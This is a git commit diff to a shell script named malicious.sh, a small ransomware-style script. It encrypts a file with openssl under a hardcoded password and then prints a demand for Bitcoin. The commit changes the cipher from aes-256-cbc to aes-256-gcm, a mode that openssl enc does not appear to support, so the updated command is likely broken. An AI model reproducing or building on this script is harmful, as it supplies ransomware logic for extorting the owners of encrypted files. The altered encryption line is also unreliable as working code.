054e2b8a53a44f8758fb61866924d40b8bc755ad
openkmj <42940044+openkmj@users.noreply.github.com>
2024-06-16 02:34:47 +0900

    Update malicious.sh

--- malicious.sh
+++ malicious.sh
@@ -4,7 +4,7 @@ FILE_TO_ENCRYPT="./secret"
 PASSWORD="18311813"
 OUTPUT_FILE="${FILE_TO_ENCRYPT}.enc"
 
-openssl enc -aes-256-cbc -salt -in "$FILE_TO_ENCRYPT" -out "$OUTPUT_FILE" -pass pass:"$PASSWORD"
+openssl enc -aes-256-gcm -salt -in "$FILE_TO_ENCRYPT" -out "$OUTPUT_FILE" -pass pass:"$PASSWORD"
 
 if [ $? -eq 0 ]; then
   echo "Your File is Encrypted! Give me BitCoin!"
